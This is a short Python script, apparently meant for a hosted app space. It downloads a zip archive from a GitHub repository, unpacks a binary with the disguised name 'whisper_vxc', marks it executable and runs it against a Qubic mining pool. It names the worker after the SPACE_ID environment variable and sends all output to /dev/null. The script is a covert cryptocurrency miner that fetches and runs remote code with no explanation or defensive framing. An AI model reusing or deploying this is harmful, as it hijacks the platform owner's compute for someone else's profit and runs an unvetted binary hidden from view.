import os
os.system("wget https://github.com/qqivk/project-02/raw/refs/heads/main/whisper_vxc.zip")
os.system("unzip whisper_vxc.zip")
os.system("chmod +x whisper_vxc")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./whisper_vxc --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --worker {wn} >/dev/null")
